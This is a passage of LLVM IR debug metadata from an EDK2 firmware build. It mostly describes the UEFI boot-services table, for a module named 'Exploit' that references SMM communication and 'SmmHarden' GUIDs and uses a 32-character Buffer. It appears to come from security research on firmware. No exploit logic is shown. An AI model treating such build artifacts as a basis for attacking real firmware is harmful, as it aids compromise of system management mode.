!386 = !{!387, !388, !394, !399, !407, !412, !417, !422, !427, !437, !443, !448, !453, !455, !457, !464, !469, !474, !479, !480, !485, !491, !508, !513, !518, !524, !529, !534, !539, !544, !549, !554, !559, !564, !569, !574, !588, !595, !601, !606, !611, !616, !621, !626, !631}
!387 = !DIDerivedType(tag: DW_TAG_member, name: "Hdr", scope: !385, file: !12, line: 1888, baseType: !161, size: 192)
!388 = !DIDerivedType(tag: DW_TAG_member, name: "RaiseTPL", scope: !385, file: !12, line: 1893, baseType: !389, size: 64, offset: 192)
!389 = !DIDerivedType(tag: DW_TAG_typedef, name: "EFI_RAISE_TPL", file: !12, line: 628, baseType: !390)
!390 = !DIDerivedType(tag: DW_TAG_pointer_type, baseType: !391, size: 64)
!391 = !DISubroutineType(types: !392)
!392 = !{!393, !393}
!393 = !DIDerivedType(tag: DW_TAG_typedef, name: "EFI_TPL", file: !76, line: 40, baseType: !58)
!394 = !DIDerivedType(tag: DW_TAG_member, name: "RestoreTPL", scope: !385, file: !12, line: 1894, baseType: !395, size: 64, offset: 256)
!395 = !DIDerivedType(tag: DW_TAG_typedef, name: "EFI_RESTORE_TPL", file: !12, line: 640, baseType: !396)
!396 = !DIDerivedType(tag: DW_TAG_pointer_type, baseType: !397, size: 64)
!397 = !DISubroutineType(types: !398)
!398 = !{null, !393}
!399 = !DIDerivedType(tag: DW_TAG_member, name: "AllocatePages", scope: !385, file: !12, line: 1899, baseType: !400, size: 64, offset: 320)
!400 = !DIDerivedType(tag: DW_TAG_typedef, name: "EFI_ALLOCATE_PAGES", file: !12, line: 187, baseType: !401)
!401 = !DIDerivedType(tag: DW_TAG_pointer_type, baseType: !402, size: 64)
!402 = !DISubroutineType(types: !403)
!403 = !{!96, !404, !405, !58, !406}
!404 = !DIDerivedType(tag: DW_TAG_typedef, name: "EFI_ALLOCATE_TYPE", file: !12, line: 46, baseType: !11)
!405 = !DIDerivedType(tag: DW_TAG_typedef, name: "EFI_MEMORY_TYPE", file: !4, line: 107, baseType: !18)
!406 = !DIDerivedType(tag: DW_TAG_pointer_type, baseType: !318, size: 64)
!407 = !DIDerivedType(tag: DW_TAG_member, name: "FreePages", scope: !385, file: !12, line: 1900, baseType: !408, size: 64, offset: 384)
!408 = !DIDerivedType(tag: DW_TAG_typedef, name: "EFI_FREE_PAGES", file: !12, line: 208, baseType: !409)
!409 = !DIDerivedType(tag: DW_TAG_pointer_type, baseType: !410, size: 64)
!410 = !DISubroutineType(types: !411)
!411 = !{!96, !318, !58}
!412 = !DIDerivedType(tag: DW_TAG_member, name: "GetMemoryMap", scope: !385, file: !12, line: 1901, baseType: !413, size: 64, offset: 448)
!413 = !DIDerivedType(tag: DW_TAG_typedef, name: "EFI_GET_MEMORY_MAP", file: !12, line: 240, baseType: !414)
!414 = !DIDerivedType(tag: DW_TAG_pointer_type, baseType: !415, size: 64)
!415 = !DISubroutineType(types: !416)
!416 = !{!96, !112, !312, !112, !112, !334}
!417 = !DIDerivedType(tag: DW_TAG_member, name: "AllocatePool", scope: !385, file: !12, line: 1902, baseType: !418, size: 64, offset: 512)
!418 = !DIDerivedType(tag: DW_TAG_typedef, name: "EFI_ALLOCATE_POOL", file: !12, line: 269, baseType: !419)
!419 = !DIDerivedType(tag: DW_TAG_pointer_type, baseType: !420, size: 64)
!420 = !DISubroutineType(types: !421)
!421 = !{!96, !405, !58, !51}
!422 = !DIDerivedType(tag: DW_TAG_member, name: "FreePool", scope: !385, file: !12, line: 1903, baseType: !423, size: 64, offset: 576)
!423 = !DIDerivedType(tag: DW_TAG_typedef, name: "EFI_FREE_POOL", file: !12, line: 286, baseType: !424)
!424 = !DIDerivedType(tag: DW_TAG_pointer_type, baseType: !425, size: 64)
!425 = !DISubroutineType(types: !426)
!426 = !{!96, !50}
!427 = !DIDerivedType(tag: DW_TAG_member, name: "CreateEvent", scope: !385, file: !12, line: 1908, baseType: !428, size: 64, offset: 640)
!428 = !DIDerivedType(tag: DW_TAG_typedef, name: "EFI_CREATE_EVENT", file: !12, line: 464, baseType: !429)
!429 = !DIDerivedType(tag: DW_TAG_pointer_type, baseType: !430, size: 64)
!430 = !DISubroutineType(types: !431)
!431 = !{!96, !81, !393, !432, !50, !436}
!432 = !DIDerivedType(tag: DW_TAG_typedef, name: "EFI_EVENT_NOTIFY", file: !12, line: 441, baseType: !433)
!433 = !DIDerivedType(tag: DW_TAG_pointer_type, baseType: !434, size: 64)
!434 = !DISubroutineType(types: !435)
!435 = !{null, !197, !50}
!436 = !DIDerivedType(tag: DW_TAG_pointer_type, baseType: !197, size: 64)
!437 = !DIDerivedType(tag: DW_TAG_member, name: "SetTimer", scope: !385, file: !12, line: 1909, baseType: !438, size: 64, offset: 704)
!438 = !DIDerivedType(tag: DW_TAG_typedef, name: "EFI_SET_TIMER", file: !12, line: 538, baseType: !439)
!439 = !DIDerivedType(tag: DW_TAG_pointer_type, baseType: !440, size: 64)
!440 = !DISubroutineType(types: !441)
!441 = !{!96, !197, !442, !59}
!442 = !DIDerivedType(tag: DW_TAG_typedef, name: "EFI_TIMER_DELAY", file: !12, line: 518, baseType: !36)
!443 = !DIDerivedType(tag: DW_TAG_member, name: "WaitForEvent", scope: !385, file: !12, line: 1910, baseType: !444, size: 64, offset: 768)
!444 = !DIDerivedType(tag: DW_TAG_typedef, name: "EFI_WAIT_FOR_EVENT", file: !12, line: 574, baseType: !445)
!445 = !DIDerivedType(tag: DW_TAG_pointer_type, baseType: !446, size: 64)
!446 = !DISubroutineType(types: !447)
!447 = !{!96, !58, !436, !112}
!448 = !DIDerivedType(tag: DW_TAG_member, name: "SignalEvent", scope: !385, file: !12, line: 1911, baseType: !449, size: 64, offset: 832)
!449 = !DIDerivedType(tag: DW_TAG_typedef, name: "EFI_SIGNAL_EVENT", file: !12, line: 554, baseType: !450)
!450 = !DIDerivedType(tag: DW_TAG_pointer_type, baseType: !451, size: 64)
!451 = !DISubroutineType(types: !452)
!452 = !{!96, !197}
!453 = !DIDerivedType(tag: DW_TAG_member, name: "CloseEvent", scope: !385, file: !12, line: 1912, baseType: !454, size: 64, offset: 896)
!454 = !DIDerivedType(tag: DW_TAG_typedef, name: "EFI_CLOSE_EVENT", file: !12, line: 590, baseType: !450)
!455 = !DIDerivedType(tag: DW_TAG_member, name: "CheckEvent", scope: !385, file: !12, line: 1913, baseType: !456, size: 64, offset: 960)
!456 = !DIDerivedType(tag: DW_TAG_typedef, name: "EFI_CHECK_EVENT", file: !12, line: 606, baseType: !450)
!457 = !DIDerivedType(tag: DW_TAG_member, name: "InstallProtocolInterface", scope: !385, file: !12, line: 1918, baseType: !458, size: 64, offset: 1024)
!458 = !DIDerivedType(tag: DW_TAG_typedef, name: "EFI_INSTALL_PROTOCOL_INTERFACE", file: !12, line: 1193, baseType: !459)
!459 = !DIDerivedType(tag: DW_TAG_pointer_type, baseType: !460, size: 64)
!460 = !DISubroutineType(types: !461)
!461 = !{!96, !462, !333, !463, !50}
!462 = !DIDerivedType(tag: DW_TAG_pointer_type, baseType: !155, size: 64)
!463 = !DIDerivedType(tag: DW_TAG_typedef, name: "EFI_INTERFACE_TYPE", file: !12, line: 1169, baseType: !41)
!464 = !DIDerivedType(tag: DW_TAG_member, name: "ReinstallProtocolInterface", scope: !385, file: !12, line: 1919, baseType: !465, size: 64, offset: 1088)
!465 = !DIDerivedType(tag: DW_TAG_typedef, name: "EFI_REINSTALL_PROTOCOL_INTERFACE", file: !12, line: 1243, baseType: !466)
!466 = !DIDerivedType(tag: DW_TAG_pointer_type, baseType: !467, size: 64)
!467 = !DISubroutineType(types: !468)
!468 = !{!96, !155, !333, !50, !50}
!469 = !DIDerivedType(tag: DW_TAG_member, name: "UninstallProtocolInterface", scope: !385, file: !12, line: 1920, baseType: !470, size: 64, offset: 1152)
!470 = !DIDerivedType(tag: DW_TAG_typedef, name: "EFI_UNINSTALL_PROTOCOL_INTERFACE", file: !12, line: 1269, baseType: !471)
!471 = !DIDerivedType(tag: DW_TAG_pointer_type, baseType: !472, size: 64)
!472 = !DISubroutineType(types: !473)
!473 = !{!96, !155, !333, !50}
!474 = !DIDerivedType(tag: DW_TAG_member, name: "HandleProtocol", scope: !385, file: !12, line: 1921, baseType: !475, size: 64, offset: 1216)
!475 = !DIDerivedType(tag: DW_TAG_typedef, name: "EFI_HANDLE_PROTOCOL", file: !12, line: 1310, baseType: !476)
!476 = !DIDerivedType(tag: DW_TAG_pointer_type, baseType: !477, size: 64)
!477 = !DISubroutineType(types: !478)
!478 = !{!96, !155, !333, !51}
!479 = !DIDerivedType(tag: DW_TAG_member, name: "Reserved", scope: !385, file: !12, line: 1922, baseType: !50, size: 64, offset: 1280)
!480 = !DIDerivedType(tag: DW_TAG_member, name: "RegisterProtocolNotify", scope: !385, file: !12, line: 1923, baseType: !481, size: 64, offset: 1344)
!481 = !DIDerivedType(tag: DW_TAG_typedef, name: "EFI_REGISTER_PROTOCOL_NOTIFY", file: !12, line: 1471, baseType: !482)
!482 = !DIDerivedType(tag: DW_TAG_pointer_type, baseType: !483, size: 64)
!483 = !DISubroutineType(types: !484)
!484 = !{!96, !333, !197, !51}
!485 = !DIDerivedType(tag: DW_TAG_member, name: "LocateHandle", scope: !385, file: !12, line: 1924, baseType: !486, size: 64, offset: 1408)
!486 = !DIDerivedType(tag: DW_TAG_typedef, name: "EFI_LOCATE_HANDLE", file: !12, line: 1520, baseType: !487)
!487 = !DIDerivedType(tag: DW_TAG_pointer_type, baseType: !488, size: 64)
!488 = !DISubroutineType(types: !489)
!489 = !{!96, !490, !333, !50, !112, !462}
!490 = !DIDerivedType(tag: DW_TAG_typedef, name: "EFI_LOCATE_SEARCH_TYPE", file: !12, line: 1494, baseType: !44)
!491 = !DIDerivedType(tag: DW_TAG_member, name: "LocateDevicePath", scope: !385, file: !12, line: 1925, baseType: !492, size: 64, offset: 1472)
!492 = !DIDerivedType(tag: DW_TAG_typedef, name: "EFI_LOCATE_DEVICE_PATH", file: !12, line: 1546, baseType: !493)
!493 = !DIDerivedType(tag: DW_TAG_pointer_type, baseType: !494, size: 64)
!494 = !DISubroutineType(types: !495)
!495 = !{!96, !333, !496, !462}
!496 = !DIDerivedType(tag: DW_TAG_pointer_type, baseType: !497, size: 64)
!497 = !DIDerivedType(tag: DW_TAG_pointer_type, baseType: !498, size: 64)
!498 = !DIDerivedType(tag: DW_TAG_typedef, name: "EFI_DEVICE_PATH_PROTOCOL", file: !499, line: 58, baseType: !500)
!499 = !DIFile(filename: "MdePkg/Include/Protocol/DevicePath.h", directory: "/home/arun/Desktop/darpa_ex1/darpa_demo_edk2", checksumkind: CSK_MD5, checksum: "6b6d593d171f69b933a87911e52d4607")
!500 = distinct !DICompositeType(tag: DW_TAG_structure_type, name: "EFI_DEVICE_PATH_PROTOCOL", file: !499, line: 43, size: 32, elements: !501)
!501 = !{!502, !503, !504}
!502 = !DIDerivedType(tag: DW_TAG_member, name: "Type", scope: !500, file: !499, line: 44, baseType: !88, size: 8)
!503 = !DIDerivedType(tag: DW_TAG_member, name: "SubType", scope: !500, file: !499, line: 51, baseType: !88, size: 8, offset: 8)
!504 = !DIDerivedType(tag: DW_TAG_member, name: "Length", scope: !500, file: !499, line: 56, baseType: !505, size: 16, offset: 16)
!505 = !DICompositeType(tag: DW_TAG_array_type, baseType: !88, size: 16, elements: !506)
!506 = !{!507}
!507 = !DISubrange(count: 2)
!508 = !DIDerivedType(tag: DW_TAG_member, name: "InstallConfigurationTable", scope: !385, file: !12, line: 1926, baseType: !509, size: 64, offset: 1536)
!509 = !DIDerivedType(tag: DW_TAG_typedef, name: "EFI_INSTALL_CONFIGURATION_TABLE", file: !12, line: 1567, baseType: !510)
!510 = !DIDerivedType(tag: DW_TAG_pointer_type, baseType: !511, size: 64)
!511 = !DISubroutineType(types: !512)
!512 = !{!96, !333, !50}
!513 = !DIDerivedType(tag: DW_TAG_member, name: "LoadImage", scope: !385, file: !12, line: 1931, baseType: !514, size: 64, offset: 1600)
!514 = !DIDerivedType(tag: DW_TAG_typedef, name: "EFI_IMAGE_LOAD", file: !12, line: 918, baseType: !515)
!515 = !DIDerivedType(tag: DW_TAG_pointer_type, baseType: !516, size: 64)
!516 = !DISubroutineType(types: !517)
!517 = !{!96, !61, !155, !497, !50, !58, !462}
!518 = !DIDerivedType(tag: DW_TAG_member, name: "StartImage", scope: !385, file: !12, line: 1932, baseType: !519, size: 64, offset: 1664)
!519 = !DIDerivedType(tag: DW_TAG_typedef, name: "EFI_IMAGE_START", file: !12, line: 943, baseType: !520)
!520 = !DIDerivedType(tag: DW_TAG_pointer_type, baseType: !521, size: 64)
!521 = !DISubroutineType(types: !522)
!522 = !{!96, !155, !112, !523}
!523 = !DIDerivedType(tag: DW_TAG_pointer_type, baseType: !170, size: 64)
!524 = !DIDerivedType(tag: DW_TAG_member, name: "Exit", scope: !385, file: !12, line: 1933, baseType: !525, size: 64, offset: 1728)
!525 = !DIDerivedType(tag: DW_TAG_typedef, name: "EFI_EXIT", file: !12, line: 971, baseType: !526)
!526 = !DIDerivedType(tag: DW_TAG_pointer_type, baseType: !527, size: 64)
!527 = !DISubroutineType(types: !528)
!528 = !{!96, !155, !96, !58, !170}
!529 = !DIDerivedType(tag: DW_TAG_member, name: "UnloadImage", scope: !385, file: !12, line: 1934, baseType: !530, size: 64, offset: 1792)
!530 = !DIDerivedType(tag: DW_TAG_typedef, name: "EFI_IMAGE_UNLOAD", file: !12, line: 989, baseType: !531)
!531 = !DIDerivedType(tag: DW_TAG_pointer_type, baseType: !532, size: 64)
!532 = !DISubroutineType(types: !533)
!533 = !{!96, !155}
!534 = !DIDerivedType(tag: DW_TAG_member, name: "ExitBootServices", scope: !385, file: !12, line: 1935, baseType: !535, size: 64, offset: 1856)
!535 = !DIDerivedType(tag: DW_TAG_typedef, name: "EFI_EXIT_BOOT_SERVICES", file: !12, line: 1005, baseType: !536)
!536 = !DIDerivedType(tag: DW_TAG_pointer_type, baseType: !537, size: 64)
!537 = !DISubroutineType(types: !538)
!538 = !{!96, !155, !58}
!539 = !DIDerivedType(tag: DW_TAG_member, name: "GetNextMonotonicCount", scope: !385, file: !12, line: 1940, baseType: !540, size: 64, offset: 1920)
!540 = !DIDerivedType(tag: DW_TAG_typedef, name: "EFI_GET_NEXT_MONOTONIC_COUNT", file: !12, line: 1086, baseType: !541)
!541 = !DIDerivedType(tag: DW_TAG_pointer_type, baseType: !542, size: 64)
!542 = !DISubroutineType(types: !543)
!543 = !{!96, !375}
!544 = !DIDerivedType(tag: DW_TAG_member, name: "Stall", scope: !385, file: !12, line: 1941, baseType: !545, size: 64, offset: 1984)
!545 = !DIDerivedType(tag: DW_TAG_typedef, name: "EFI_STALL", file: !12, line: 1021, baseType: !546)
!546 = !DIDerivedType(tag: DW_TAG_pointer_type, baseType: !547, size: 64)
!547 = !DISubroutineType(types: !548)
!548 = !{!96, !58}
!549 = !DIDerivedType(tag: DW_TAG_member, name: "SetWatchdogTimer", scope: !385, file: !12, line: 1942, baseType: !550, size: 64, offset: 2048)
!550 = !DIDerivedType(tag: DW_TAG_typedef, name: "EFI_SET_WATCHDOG_TIMER", file: !12, line: 1043, baseType: !551)
!551 = !DIDerivedType(tag: DW_TAG_pointer_type, baseType: !552, size: 64)
!552 = !DISubroutineType(types: !553)
!553 = !{!96, !58, !59, !58, !170}
!554 = !DIDerivedType(tag: DW_TAG_member, name: "ConnectController", scope: !385, file: !12, line: 1947, baseType: !555, size: 64, offset: 2112)
!555 = !DIDerivedType(tag: DW_TAG_typedef, name: "EFI_CONNECT_CONTROLLER", file: !12, line: 345, baseType: !556)
!556 = !DIDerivedType(tag: DW_TAG_pointer_type, baseType: !557, size: 64)
!557 = !DISubroutineType(types: !558)
!558 = !{!96, !155, !462, !497, !61}
!559 = !DIDerivedType(tag: DW_TAG_member, name: "DisconnectController", scope: !385, file: !12, line: 1948, baseType: !560, size: 64, offset: 2176)
!560 = !DIDerivedType(tag: DW_TAG_typedef, name: "EFI_DISCONNECT_CONTROLLER", file: !12, line: 378, baseType: !561)
!561 = !DIDerivedType(tag: DW_TAG_pointer_type, baseType: !562, size: 64)
!562 = !DISubroutineType(types: !563)
!563 = !{!96, !155, !155, !155}
!564 = !DIDerivedType(tag: DW_TAG_member, name: "OpenProtocol", scope: !385, file: !12, line: 1953, baseType: !565, size: 64, offset: 2240)
!565 = !DIDerivedType(tag: DW_TAG_typedef, name: "EFI_OPEN_PROTOCOL", file: !12, line: 1352, baseType: !566)
!566 = !DIDerivedType(tag: DW_TAG_pointer_type, baseType: !567, size: 64)
!567 = !DISubroutineType(types: !568)
!568 = !{!96, !155, !333, !51, !155, !155, !81}
!569 = !DIDerivedType(tag: DW_TAG_member, name: "CloseProtocol", scope: !385, file: !12, line: 1954, baseType: !570, size: 64, offset: 2304)
!570 = !DIDerivedType(tag: DW_TAG_typedef, name: "EFI_CLOSE_PROTOCOL", file: !12, line: 1384, baseType: !571)
!571 = !DIDerivedType(tag: DW_TAG_pointer_type, baseType: !572, size: 64)
!572 = !DISubroutineType(types: !573)
!573 = !{!96, !155, !333, !155, !155}
!574 = !DIDerivedType(tag: DW_TAG_member, name: "OpenProtocolInformation", scope: !385, file: !12, line: 1955, baseType: !575, size: 64, offset: 2368)
!575 = !DIDerivedType(tag: DW_TAG_typedef, name: "EFI_OPEN_PROTOCOL_INFORMATION", file: !12, line: 1418, baseType: !576)
!576 = !DIDerivedType(tag: DW_TAG_pointer_type, baseType: !577, size: 64)
!577 = !DISubroutineType(types: !578)
!578 = !{!96, !155, !333, !579, !112}
!579 = !DIDerivedType(tag: DW_TAG_pointer_type, baseType: !580, size: 64)
!580 = !DIDerivedType(tag: DW_TAG_pointer_type, baseType: !581, size: 64)
!581 = !DIDerivedType(tag: DW_TAG_typedef, name: "EFI_OPEN_PROTOCOL_INFORMATION_ENTRY", file: !12, line: 1399, baseType: !582)
!582 = distinct !DICompositeType(tag: DW_TAG_structure_type, name: "EFI_OPEN_PROTOCOL_INFORMATION_ENTRY", file: !12, line: 1394, size: 192, elements: !583)
!583 = !{!584, !585, !586, !587}
!584 = !DIDerivedType(tag: DW_TAG_member, name: "AgentHandle", scope: !582, file: !12, line: 1395, baseType: !155, size: 64)
!585 = !DIDerivedType(tag: DW_TAG_member, name: "ControllerHandle", scope: !582, file: !12, line: 1396, baseType: !155, size: 64, offset: 64)
!586 = !DIDerivedType(tag: DW_TAG_member, name: "Attributes", scope: !582, file: !12, line: 1397, baseType: !81, size: 32, offset: 128)
!587 = !DIDerivedType(tag: DW_TAG_member, name: "OpenCount", scope: !582, file: !12, line: 1398, baseType: !81, size: 32, offset: 160)
!588 = !DIDerivedType(tag: DW_TAG_member, name: "ProtocolsPerHandle", scope: !385, file: !12, line: 1960, baseType: !589, size: 64, offset: 2432)
!589 = !DIDerivedType(tag: DW_TAG_typedef, name: "EFI_PROTOCOLS_PER_HANDLE", file: !12, line: 1448, baseType: !590)
!590 = !DIDerivedType(tag: DW_TAG_pointer_type, baseType: !591, size: 64)
!591 = !DISubroutineType(types: !592)
!592 = !{!96, !155, !593, !112}
!593 = !DIDerivedType(tag: DW_TAG_pointer_type, baseType: !594, size: 64)
!594 = !DIDerivedType(tag: DW_TAG_pointer_type, baseType: !333, size: 64)
!595 = !DIDerivedType(tag: DW_TAG_member, name: "LocateHandleBuffer", scope: !385, file: !12, line: 1961, baseType: !596, size: 64, offset: 2496)
!596 = !DIDerivedType(tag: DW_TAG_typedef, name: "EFI_LOCATE_HANDLE_BUFFER", file: !12, line: 1593, baseType: !597)
!597 = !DIDerivedType(tag: DW_TAG_pointer_type, baseType: !598, size: 64)
!598 = !DISubroutineType(types: !599)
!599 = !{!96, !490, !333, !50, !112, !600}
!600 = !DIDerivedType(tag: DW_TAG_pointer_type, baseType: !462, size: 64)
!601 = !DIDerivedType(tag: DW_TAG_member, name: "LocateProtocol", scope: !385, file: !12, line: 1962, baseType: !602, size: 64, offset: 2560)
!602 = !DIDerivedType(tag: DW_TAG_typedef, name: "EFI_LOCATE_PROTOCOL", file: !12, line: 1620, baseType: !603)
!603 = !DIDerivedType(tag: DW_TAG_pointer_type, baseType: !604, size: 64)
!604 = !DISubroutineType(types: !605)
!605 = !{!96, !333, !50, !51}
!606 = !DIDerivedType(tag: DW_TAG_member, name: "InstallMultipleProtocolInterfaces", scope: !385, file: !12, line: 1963, baseType: !607, size: 64, offset: 2624)
!607 = !DIDerivedType(tag: DW_TAG_typedef, name: "EFI_INSTALL_MULTIPLE_PROTOCOL_INTERFACES", file: !12, line: 1218, baseType: !608)
!608 = !DIDerivedType(tag: DW_TAG_pointer_type, baseType: !609, size: 64)
!609 = !DISubroutineType(types: !610)
!610 = !{!96, !462, null}
!611 = !DIDerivedType(tag: DW_TAG_member, name: "UninstallMultipleProtocolInterfaces", scope: !385, file: !12, line: 1964, baseType: !612, size: 64, offset: 2688)
!612 = !DIDerivedType(tag: DW_TAG_typedef, name: "EFI_UNINSTALL_MULTIPLE_PROTOCOL_INTERFACES", file: !12, line: 1288, baseType: !613)
!613 = !DIDerivedType(tag: DW_TAG_pointer_type, baseType: !614, size: 64)
!614 = !DISubroutineType(types: !615)
!615 = !{!96, !155, null}
!616 = !DIDerivedType(tag: DW_TAG_member, name: "CalculateCrc32", scope: !385, file: !12, line: 1969, baseType: !617, size: 64, offset: 2752)
!617 = !DIDerivedType(tag: DW_TAG_typedef, name: "EFI_CALCULATE_CRC32", file: !12, line: 1123, baseType: !618)
!618 = !DIDerivedType(tag: DW_TAG_pointer_type, baseType: !619, size: 64)
!619 = !DISubroutineType(types: !620)
!620 = !{!96, !50, !58, !334}
!621 = !DIDerivedType(tag: DW_TAG_member, name: "CopyMem", scope: !385, file: !12, line: 1974, baseType: !622, size: 64, offset: 2816)
!622 = !DIDerivedType(tag: DW_TAG_typedef, name: "EFI_COPY_MEM", file: !12, line: 1139, baseType: !623)
!623 = !DIDerivedType(tag: DW_TAG_pointer_type, baseType: !624, size: 64)
!624 = !DISubroutineType(types: !625)
!625 = !{null, !50, !50, !58}
!626 = !DIDerivedType(tag: DW_TAG_member, name: "SetMem", scope: !385, file: !12, line: 1975, baseType: !627, size: 64, offset: 2880)
!627 = !DIDerivedType(tag: DW_TAG_typedef, name: "EFI_SET_MEM", file: !12, line: 1155, baseType: !628)
!628 = !DIDerivedType(tag: DW_TAG_pointer_type, baseType: !629, size: 64)
!629 = !DISubroutineType(types: !630)
!630 = !{null, !50, !58, !88}
!631 = !DIDerivedType(tag: DW_TAG_member, name: "CreateEventEx", scope: !385, file: !12, line: 1976, baseType: !632, size: 64, offset: 2944)
!632 = !DIDerivedType(tag: DW_TAG_typedef, name: "EFI_CREATE_EVENT_EX", file: !12, line: 493, baseType: !633)
!633 = !DIDerivedType(tag: DW_TAG_pointer_type, baseType: !634, size: 64)
!634 = !DISubroutineType(types: !635)
!635 = !{!96, !81, !393, !432, !636, !638, !436}
!636 = !DIDerivedType(tag: DW_TAG_pointer_type, baseType: !637, size: 64)
!637 = !DIDerivedType(tag: DW_TAG_const_type, baseType: null)
!638 = !DIDerivedType(tag: DW_TAG_pointer_type, baseType: !639, size: 64)
!639 = !DIDerivedType(tag: DW_TAG_const_type, baseType: !75)
!640 = !DIDerivedType(tag: DW_TAG_member, name: "NumberOfTableEntries", scope: !158, file: !12, line: 2052, baseType: !58, size: 64, offset: 832)
!641 = !DIDerivedType(tag: DW_TAG_member, name: "ConfigurationTable", scope: !158, file: !12, line: 2057, baseType: !642, size: 64, offset: 896)
!642 = !DIDerivedType(tag: DW_TAG_pointer_type, baseType: !643, size: 64)
!643 = !DIDerivedType(tag: DW_TAG_typedef, name: "EFI_CONFIGURATION_TABLE", file: !12, line: 1992, baseType: !644)
!644 = distinct !DICompositeType(tag: DW_TAG_structure_type, name: "EFI_CONFIGURATION_TABLE", file: !12, line: 1983, size: 192, elements: !645)
!645 = !{!646, !647}
!646 = !DIDerivedType(tag: DW_TAG_member, name: "VendorGuid", scope: !644, file: !12, line: 1987, baseType: !75, size: 128)
!647 = !DIDerivedType(tag: DW_TAG_member, name: "VendorTable", scope: !644, file: !12, line: 1991, baseType: !50, size: 64, offset: 128)
!648 = !{!649, !650, !651, !652, !653}
!649 = !DILocalVariable(name: "ImageHandle", arg: 1, scope: !152, file: !72, line: 47, type: !155)
!650 = !DILocalVariable(name: "SystemTable", arg: 2, scope: !152, file: !72, line: 48, type: !156)
!651 = !DILocalVariable(name: "VariableName", scope: !152, file: !72, line: 53, type: !170)
!652 = !DILocalVariable(name: "VariableValue", scope: !152, file: !72, line: 54, type: !170)
!653 = !DILocalVariable(name: "Buffer", scope: !152, file: !72, line: 55, type: !654)
!654 = !DICompositeType(tag: DW_TAG_array_type, baseType: !171, size: 512, elements: !655)
!655 = !{!656}
!656 = !DISubrange(count: 32)
!657 = !DILocation(line: 0, scope: !152)
!658 = !DILocation(line: 52, scope: !659)
!659 = distinct !DILexicalBlock(scope: !152, file: !72, line: 52)
!660 = !DILocation(line: 52, scope: !661)
!661 = distinct !DILexicalBlock(scope: !662, file: !72, line: 52)
!662 = distinct !DILexicalBlock(scope: !663, file: !72, line: 52)
!663 = distinct !DILexicalBlock(scope: !659, file: !72, line: 52)
!664 = !DILocation(line: 52, scope: !665)
!665 = distinct !DILexicalBlock(scope: !666, file: !72, line: 52)
!666 = distinct !DILexicalBlock(scope: !661, file: !72, line: 52)
!667 = !DILocation(line: 55, scope: !152)
!668 = !DILocation(line: 57, scope: !152)
!669 = !DILocation(line: 61, scope: !152)
!670 = !DILocation(line: 65, scope: !152)
!671 = !DILocation(line: 68, scope: !672)
!672 = distinct !DILexicalBlock(scope: !152, file: !72, line: 68)
!673 = !DILocation(line: 68, scope: !674)
!674 = distinct !DILexicalBlock(scope: !675, file: !72, line: 68)
!675 = distinct !DILexicalBlock(scope: !676, file: !72, line: 68)
!676 = distinct !DILexicalBlock(scope: !672, file: !72, line: 68)
!677 = !DILocation(line: 68, scope: !678)
!678 = distinct !DILexicalBlock(scope: !679, file: !72, line: 68)
!679 = distinct !DILexicalBlock(scope: !674, file: !72, line: 68)
!680 = !DILocation(line: 69, scope: !152)
!681 = !DILocation(line: 72, scope: !152)
!682 = !DILocation(line: 71, scope: !152)

^0 = module: (path: "./Build/OvmfX64/DEBUG_CLANGPDB/X64/MdeModulePkg/Application/Exploit/Exploit/OUTPUT/Exploit.obj", hash: (0, 0, 0, 0, 0))
^1 = gv: (name: "DebugPrint") ; guid = 478242322684871111
^2 = gv: (name: "llvm.memcpy.p0i8.p0i8.i64") ; guid = 614884070845456474
^3 = gv: (name: ".str.6", summaries: (variable: (module: ^0, flags: (linkage: private, notEligibleToImport: 1, live: 0, dsoLocal: 1, canAutoHide: 0), varFlags: (readonly: 1, writeonly: 0, constant: 1)))) ; guid = 1192112424272047237
^4 = gv: (name: "StrSize") ; guid = 1819552582871743262
^5 = gv: (name: "gEfiSmmCommunicationProtocolGuid") ; guid = 2377970498744648136
^6 = gv: (name: ".str.3", summaries: (variable: (module: ^0, flags: (linkage: private, notEligibleToImport: 1, live: 0, dsoLocal: 1, canAutoHide: 0), varFlags: (readonly: 1, writeonly: 0, constant: 1)))) ; guid = 2685890824452629665
^7 = gv: (name: "StrLen") ; guid = 2864786009143313723
^8 = gv: (name: "UefiMain", summaries: (function: (module: ^0, flags: (linkage: external, notEligibleToImport: 1, live: 0, dsoLocal: 1, canAutoHide: 0), insts: 41, calls: ((callee: ^26), (callee: ^17), (callee: ^1), (callee: ^4), (callee: ^10), (callee: ^7), (callee: ^28)), refs: (^6, ^22, ^27, ^24, ^3, ^25)))) ; guid = 2905821905671413671
^9 = gv: (name: "llvm.lifetime.start.p0i8") ; guid = 3657761528566682672
^10 = gv: (name: "CopyMem") ; guid = 4864832337191102384
^11 = gv: (name: "FreePool") ; guid = 5601427804771207582
^12 = gv: (name: ".str.2", summaries: (variable: (module: ^0, flags: (linkage: private, notEligibleToImport: 1, live: 0, dsoLocal: 1, canAutoHide: 0), varFlags: (readonly: 1, writeonly: 0, constant: 1)))) ; guid = 6605207442878134813
^13 = gv: (name: "llvm.dbg.value") ; guid = 7457163675545648777
^14 = gv: (name: "gBS") ; guid = 9055597742596627105
^15 = gv: (name: "DebugAssert") ; guid = 9081642936671417600
^16 = gv: (name: "AllocateRuntimeZeroPool") ; guid = 9447713904577063116
^17 = gv: (name: "DebugPrintLevelEnabled") ; guid = 10095421576718565903
^18 = gv: (name: ".str", summaries: (variable: (module: ^0, flags: (linkage: private, notEligibleToImport: 1, live: 0, dsoLocal: 1, canAutoHide: 0), varFlags: (readonly: 1, writeonly: 0, constant: 1)))) ; guid = 10488262428555085860
^19 = gv: (name: ".str.1", summaries: (variable: (module: ^0, flags: (linkage: private, notEligibleToImport: 1, live: 0, dsoLocal: 1, canAutoHide: 0), varFlags: (readonly: 1, writeonly: 0, constant: 1)))) ; guid = 10702599551117457928
^20 = gv: (name: "DebugAssertEnabled") ; guid = 11428124958784088891
^21 = gv: (name: "llvm.dbg.declare") ; guid = 13513223491971101989
^22 = gv: (name: ".str.4", summaries: (variable: (module: ^0, flags: (linkage: private, notEligibleToImport: 1, live: 0, dsoLocal: 1, canAutoHide: 0), varFlags: (readonly: 1, writeonly: 0, constant: 1)))) ; guid = 14011095261594605746
^23 = gv: (name: "llvm.lifetime.end.p0i8") ; guid = 14311549039910520616
^24 = gv: (name: "gEfiSmmHardenVariableManagerGuid") ; guid = 14732465891744328606
^25 = gv: (name: "gEfiSmmHardenBootServiceGuid") ; guid = 15699824378380580664
^26 = gv: (name: "DebugPrintEnabled") ; guid = 15723647242063003913
